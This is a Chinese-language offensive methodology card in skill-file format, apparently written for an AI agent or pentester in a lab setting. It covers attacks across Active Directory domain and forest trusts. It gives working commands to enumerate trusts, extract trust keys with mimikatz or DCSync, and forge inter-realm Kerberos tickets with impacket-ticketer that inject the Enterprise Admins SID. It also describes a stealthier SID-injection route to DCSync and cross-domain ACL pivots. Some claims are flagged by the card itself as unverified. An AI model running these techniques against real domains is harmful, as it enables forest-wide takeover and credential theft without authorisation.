---
name: 'ad-trust-and-forest-pivot'
description: '已控主机上 nltest /domain_trusts 或 Get-ADTrust 返回不止一个域、BloodHound 图里两个 Domain 节点互连、共享或 DNS 后缀冒出第二个域时加载：跨域/跨林方法论 —— 信任枚举（Windows/Linux/BloodHound 三侧）、trustAttributes 类型与方向、信任票与 inter-realm TGT、SID filtering 开关与两个默认不过滤的情形、跨域 ACL 与 foreign group membership 跳板、跨林 Kerberos 差异、把拿到信任票当作能力升级。（检索词：domain trust/domain-trust/trust/forest trust/forest-trust/cross-forest/cross forest/inter-realm/inter realm/inter-realm-tgt/SID filtering/SID-filtering/SIDFilter/foreign group/foreign-group/referral/referral-ticket/trustedDomain/trustAttributes/TrustedBy/WITHIN_FOREST/FOREST_TRANSITIVE/QUARANTINED_DOMAIN/TREAT_AS_EXTERNAL/EnableSIDHistory/nltest/Get-ADTrust/bloodhound-python/ldapdomaindump/bloodyAD/extrasid/extra-sid/raiseChild/raise child/ticketer/golden ticket/golden-ticket/信任/信任关系/信任方向/信任票/跨林/跨域/跨域 ACL/子域/父子域/多域/林信任/外部信任/SID 过滤)（检索词：pivot）'
whenToUse: '环境里出现第二个域或第二条林信任时加载：先枚举边与方向，再判 SID filtering 是否生效，最后决定走票据伪造还是走跨域 ACL 跳板。'
metadata: { domain: ad-win, tier: T2 }
---

# 多域与跨林：信任枚举、信任票、SID 过滤与跨域跳板

> 🔷 Pro Lab 方法论卡（架构推导，非语料回灌）—— 尚未经 Pro Lab 实战检验

## 触发信号 / 适用处境

- 已控一台机器，`nltest` / `Get-ADTrust` / BloodHound 告诉你**外面还有域**（子域 `child.corp.local` 或第二个林）
- BloodHound 上两个 `Domain` 节点被信任边连着，但**不知道这条边能不能走**
- 手上有凭据/票据，**不知道它属于哪个域、能不能认证另一个域**

## 前置准备

```bash
sudo ntpdate -b <DC_IP>          # 每域各有 DC 授时 → 每台 DC 单独同步（ad-checklist 铁律）
# 钉死"我在哪个域"：whoami /fqdn · systeminfo | findstr /i domain · realm list · cat /etc/krb5.conf
# 建域名字典：每域 FQDN + NetBIOS + DC IP（FQDN 走 Kerberos/SPN，NetBIOS 走 NTLM，不能混用）
# 🔷 三问：① 有几条边、方向如何 ② 该边 SID filtering 开没开 ③ 有没有现成的跨域显式授权
```

## 模式 1：信任枚举 —— 先知道有几条边

**Windows 侧**

```powershell
nltest /domain_trusts /all_trusts /v   # 库内已用（ad-checklist §1.5）；MITRE T1482 标准手法
Get-ADTrust -Filter * -Properties *    # AD 模块；单条用 -Identity child.corp.local
Get-DomainTrust                        # PowerView，默认走 LDAP（🔷 会返回 forest trust —— 与下行 .NET 那条同为推论）
Get-DomainTrustMapping                 # PowerView，递归枚举整片林，可 Export-Csv
dsquery * -filter "(objectClass=trustedDomain)" -attr trustpartner,flatname,trustdirection,trustattributes
# 🔷 dsquery 无第三方工具依赖，可作兜底；.NET 的 GetAllTrustRelationships() 默认不返回 forest trust
```

**Linux 侧**

```bash
ldapsearch -H ldap://<DC_IP> -D 'svc_sql@corp.local' -w '<pass>' -b 'DC=corp,DC=local' \
  '(objectClass=trustedDomain)' trustPartner flatName trustDirection trustType trustAttributes
bloodyAD --host <DC_IP> -d corp.local -u svc_sql -p '<pass>' get trusts   # 🔷 其余 flag 待 --help 确认
```

**BloodHound 侧（别重跑全量）**

```bash
bloodhound-python -d corp.local -dc DC01.corp.local -u svc_sql -p '<pass>' -c Trusts
# ✅ 本机 --help 核实：-c 支持 Trusts（另可选 Group/LocalAdmin/Session/DCOnly/DCOM/RDP/
#    PSRemote/LoggedOn/Container/ObjectProps/ACL/All/Experimental）
#    其中 **LocalAdmin = 收集本机 Administrators 成员**（没有 LocalGroup 这个方法名）
ldapdomaindump -u 'corp.local\svc_sql' -p '<pass>' -o loot/ <DC_IP>
# 产出 domain_trusts.grep/.json（✅ 源码核实：trustsfile='domain_trusts'，查询即
# (objectClass=trustedDomain) + 全属性）
```

```cypher
MATCH (d:Domain) RETURN d
MATCH p=(d1:Domain)-[:TrustedBy]->(d2:Domain) RETURN p
```

- BH CE 拆出 `SameForestTrust`（**可穿越**，林内双向传递）与 `CrossForestTrust`（🔷 **不可穿越**、
  路径计算里被排除 —— 组合结论未核实）；🔷 **`TrustedBy` 在 CE 上是否仍存在也未核实**（那是 BH 4.x 时代的关系名）——
  若上面那条 Cypher 返回空，先跑 `MATCH p=(:Domain)-[r]->(:Domain) RETURN p, type(r)` 看**实际有哪些关系类型**；
  边带 inbound/outbound 两侧 `trustAttributes`（🔷 属性键名未核实 —— 直接点开边看属性面板最快）
- 🔴 **信任边的方向 = 访问方向，不是信任方向**

## 模式 2：类型与方向 —— 决定"哪个方向能走"

`trustAttributes` 位表（✅ 与本机 ldapdomaindump 源码逐位核对，源出 MSDN cc223779）：

| 位 | 名字 | 含义 |
|---|---|---|
| 0x1 / 0x2 | NON_TRANSITIVE / UPLEVEL_ONLY | 不可传递 / 仅 Win2000+ |
| 0x4 | QUARANTINED_DOMAIN | **SID filtering 生效**（quarantine） |
| 0x8 | FOREST_TRANSITIVE | 跨林信任 |
| 0x10 | CROSS_ORGANIZATION | 跨组织（选择性认证） |
| 0x20 | WITHIN_FOREST | 域内（父子/树根） |
| 0x40 | TREAT_AS_EXTERNAL | 跨林按 external 处理 —— 🔷 **方向未核实**：external 的语义是「只认受信域自身 SID 空间」，按此应**更严**；与「放松」相反 |
| 0x80 | USES_RC4_ENCRYPTION | 信任用 RC4 |
| 0x200 / 0x800 | CROSS_ORGANIZATION_(NO_)TGT_DELEGATION | 跨组织、禁/允 TGT 委派 |
| 0x400 | PIM_TRUST | PAM / 特权访问管理信任 |

同源枚举：`trustDirection` `1=INBOUND`/`2=OUTBOUND`/`3=BIDIRECTIONAL`；`trustType` `1=DOWNLEVEL`/`2=UPLEVEL`/`3=MIT`。

| 类型 | trustAttributes | 传递性 | 我能否跨过去（🔷 组合结论） |
|---|---|---|---|
| 父子/树根（域内） | `WITHIN_FOREST` 0x20 | 林内传递 | ✅ 最容易，SID 注入可直取 519 |
| 跨林 | `FOREST_TRANSITIVE` 0x8 | 林间传递 | ⚠️ 默认严格过滤；找显式授权或看 `/EnableSIDHistory` |
| 跨林被降级 | `0x8 + TREAT_AS_EXTERNAL` 0x40 | 传递 | 🔷 **存疑**：按 external 语义应**更严**（只认受信域 SID 空间），与「比默认跨林好打」相反；**别据此下结论，实测优先** |
| 外部信任 | `QUARANTINED_DOMAIN` 0x4 | ❌ | ❌ 只能靠显式授权 |
| 外部信任未隔离 | 无 0x4 | ❌ | ⚠️ 过滤没开 |

🔴 **方向 ≠ 可达性**：能查到传递信任 ≠ 能连到对方 DC。枚举对方域要能 bind 对方 DC（🔷 通常 PDC），
网段隔离时图上有边也走不通 → 先修可达性（`multi-hop-pivot-planning`）。

## 模式 3：信任票 / inter-realm TGT

- **域内跨域**：本地 KDC 就能发 referral TGT（林内信任密钥加密），工具透明处理
- **跨林**：本地 KDC 没有对方林 krbtgt，发的是用 **inter-realm trust key** 加密的 referral TGT；
  该 key 由**信任账户**（`TRUSTED_DOMAIN$` / `DOMAIN$`）口令派生 —— 跨林的"krbtgt 等价物"
- 拿到它 ⇒ 可伪造任意跨林 referral TGT（🔷 术语：Forging Inter-Realm Trust Tickets）

```bash
# 提取：mimikatz "lsadump::trust /patch"（库内形态见 sid-history-injection）或 DCSync 信任账户
# 伪造 inter-realm TGT（形如 krbtgt/<trusting.dom>@<trusted.dom>）
impacket-ticketer -nthash <TRUST_KEY> -domain-sid <TRUSTED_SID> -domain <trusted.dom> \
  -spn krbtgt/<trusting.dom> -extra-sid <EA_SID> Administrator
# 🔴 **密钥类型必须与来源匹配**：`lsadump::trust /patch` 输出的是 **aes256_hmac** → 要用 `-aesKey`，
#    不是 `-nthash`（同族形态见 sid-history-injection）。上面写 -nthash 只在拿到 RC4/NT 形态时成立。
# 🔷 -spn krbtgt/<对方域> 来自公开方法论，本库其它卡未验证；-extra-sid 同族形态见 sid-history-injection
```

🔴 **伪造机制不在本卡重复**：子域→父域四路径 → `sid-history-injection`；`/aes256` vs `/rc4`、
`/rodcNumber`、`/flags` 坑 → `rodc-privesc-chain`；跨林 S4U 委派 → `kerberos-only-ad`。

## 模式 4：SID Filtering —— 跨域提权的总闸门

**挡什么**：跨信任传入的 PAC `ExtraSids`（SIDHistory）里**不属于受信域自身 SID 空间**的 SID，
外加一批 well-known SID（🔷 **具体清单未核实**，别当已知集合用），在 KDC 侧被剥掉。**开关**：`trustAttributes` 的 `QUARANTINED_DOMAIN` (0x4)。

🔴 **"看 quarantine 位判断有没有过滤"会同时误报两类**：

| # | 默认不过滤的情形 | 0x4 | 真实情况 |
|---|---|---|---|
| 1 | **域内信任**（`WITHIN_FOREST` 父子/树根） | 0 | **真的不生效** —— 任意目标域 SID 可注入，含 Enterprise Admins (519) |
| 2 | **跨林信任**（`FOREST_TRANSITIVE`） | 0 | **默认仍严格过滤** —— 开关不是 quarantine，而是"是否允许 SID history" |

放松跨林过滤的正确开关（✅ 参数形态来自微软官方问答；**仅森林信任有效，域内信任无效**）：

```cmd
netdom trust <trusting.dom> /domain:<trusted.dom> /EnableSIDHistory:Yes
```

| 情况 | 能过哪些 SID | 能拿到什么 |
|---|---|---|
| 域内（不过滤） | 任意，含 519 | Enterprise Admins ⇒ 整个林 |
| 跨林 + SID history 已启用 | **仅 RID ≥ 1000** | 目标林任一 RID≥1000 的组；**拿不到** DA/EA，global/universal 组成员身份也不按 SID history 生效 |
| external / quarantine 开 | 基本过不去 | 只能靠显式授权 |

🔷 **隐蔽变体**：不注 519，改注 `Domain Controllers`(516) + `Enterprise Domain Controllers`(S-1-5-9)
做 DCSync —— 比"凭空多个 EA"低调得多。

## 模式 5：跨域 ACL 跳板

形状：BH 节点名是 `name@domain.fqdn`，跨域边一眼可辨 —— `svc_sql@corp.local -[GenericAll]-> group@child.corp.local`。

1. **Foreign group membership** —— A 域主体被加进 B 域特权组，或 B 域主机的本地 `Administrators`：
   ```bash
   bloodhound-python -d child.corp.local -dc DC01.child.corp.local -u svc_sql -p '<pass>' -c Group,LocalAdmin,ACL
   # SharpHound 等价：-Domain <foreign.fqdn> 配 --CollectionMethods Group,LocalAdmin,ACL
   # 🔴 **别写 `LocalGroup`** —— bloodhound-python 的 `valid_methods` 里没有它（只有 `localadmin`），
   #    传错会让 resolve_collection_methods() 返回 False → 调用方直接 return → **零输出、只留一行 ERROR**，
   #    现场表现像「这个域什么都没有」。收集本机 Administrators 成员的方法是 **`LocalAdmin`**。
   ```
   🔷 机器本地组用远程 SAMR 更直接：`Get-NetLocalGroupMember -ComputerName <server>`（PowerView 通常要求 `-ComputerName`，位置参数形态未核实）。
2. **Foreign ACL** —— A 域主体在 B 域对象上的显式授权：`Get-DomainObjectACL -Domain <foreign.domain>`。
3. **`Incoming Forest Trust Builders`** —— 持森林根域 `Create-Inbound-Forest-Trust` 扩展权限，
   🔷 **据称是唯一不需 EA/DA 就能创建入站森林信任的主体**（来源 SpecterOps 2025-06，**本机无法核实该引用**；
   「唯一」是绝对断言，用前自证）。组里有非预期成员 =
   对方能单方面把你的林拉进一条信任。

🔷 **顺序：先显式授权，后票据伪造** —— 前者不依赖过滤开关，命中率更稳、噪声更小。
🔴 跨域 ACE 执行时认证锚点必须是**目标域的 DC**（`-dc-ip <B域DC>`）且一律用 FQDN（用 IP 会让 SPN 匹配失败）。

## 模式 6：跨林 Kerberos 与域内的差异

| 维度 | 域内 | 跨林 |
|---|---|---|
| referral TGT | 本地 KDC 直接发，林内密钥 | 用 **inter-realm trust key** 加密 |
| SPN 解析 | 全林 GC 可查 | 对方林 SPN **不在**本林 GC → `-dc-ip` 指向对方林 DC |
| realm 解析 | 自动 | 需 `krb5.conf` 的 `[realms]`/`[domain_realm]`，或显式指定对方 DC |
| 时钟 | 仍要同步 | **每个域层次各自授时**（AD 层级同步：域 PDC → 林根 PDC）→ 跨域时逐台对齐更省事，逐个 `ntpdate -b` |
| 委派 | 林内约束委派 | 跨林 constrained delegation = "无需 Golden Ticket 的 Golden Ticket"（见 `kerberos-only-ad`） |

- 跨林 `getST` 的**已验证命令形态**抄 `kerberos-only-ad` 的跨林 S4U 一节，本卡不重复。
- 🔴 `krb5.conf` 跨 realm 键名各工具写法不一 —— **不确定就用 `-dc-ip` 显式指定对方 DC 绕过 realm 解析**。
- 🔴 报错路由：`Clock skew too great` → 换对方 DC 重新同步；`Server not found in Kerberos database` → 改用 FQDN + 对方 `-dc-ip`。

## 路径规划视角（跨域 = 四类能力升级之一）

🔷 **"新域可达"本身就是进展信号**，哪怕一台主机都没拿下。**"拿到能认证到 B 域的票 / 能 bind B 域 DC
的凭据"要立刻入台账**，按凭据类型单列（ticket ≠ hash ≠ 明文 ≠ 证书）。

```
要在 B 域做任何事 ←需要先有— ① 网络可达 B 域 DC（multi-hop-pivot-planning）
                             ② 一个 B 域能接受的凭据 / ticket
                             ③ 对该边 SID filtering 状态的判断
```

🔷 **一条信任值不值得打（三问）**：① 方向对吗 ② 过滤开没开 ③ 有没有现成显式授权。
两个"否"就把这条边记进未决队列，别现在投入。

## 快速检查清单

```bash
[ ] 每台 DC 单独 ntpdate -b（跨域/跨林尤其致命）
[ ] 每条边解 trustAttributes + trustDirection（方向 = 访问方向，别读成信任方向）
[ ] 跨林边：是否 TREAT_AS_EXTERNAL？是否启用了 SID history？
[ ] 显式授权：foreign group membership（含机器本地 Administrators）+ foreign ACL
[ ] Incoming Forest Trust Builders 组里有没有非预期成员
[ ] 跨域执行：认证锚点 = 目标域 DC，且用 FQDN 不是 IP
[ ] 台账：新域 + 信任票已入账，依赖链已写
```

## 教训

1. 🔴 **quarantine 位 = SID filtering 是个会误判的等式** —— 域内和跨林默认都没有该位，但跨林**默认是过滤的**。
2. 🔴 **信任边箭头是访问方向，不是信任方向**；**图上有边 ≠ 走得通**（枚举对方域要能 bind 对方 DC）。
3. 🔷 **先显式授权，后票据伪造** —— 前者不依赖过滤开关，噪声更小。
4. 🔷 **跨域是能力升级，不是"再多一台机器"** —— 拿到信任票就该入台账。

## 相关卡

- `sid-history-injection` —— 子域→父域全套票据伪造（Rubeus golden/diamond、raiseChild、ticketer）
- `rodc-privesc-chain` —— Golden Ticket 的 `/aes256` vs `/rc4`、`/rodcNumber`、`/flags` 坑
- `kerberos-only-ad` —— 跨林 constrained delegation、跨林 S4U 已验证形态、No-NTLM 环境
- `ad-checklist` —— 域内总路由；§1.5 信任枚举、工具局限表、时钟同步铁律
- `ntlm-relay-chain` —— LDAP(S) 中继 / RBCD / 机器账户中继（**注意：该卡没有跨域内容**；跨域中继要自己验证目标域 DC 的可达性与签名策略）
- `lateral-movement` —— 拿到跨域凭据后的横向执行面
- `multi-hop-pivot-planning` —— 跨域前的网络可达性规划（本卡管信任层，它管隧道层）
- `prolab-engagement-playbook` —— 判断这条信任线还值不值得打（关卡 1/2/3、放弃判据）
- `engagement-inventory-and-triage` —— 新域/信任票入台账的写法与依赖链
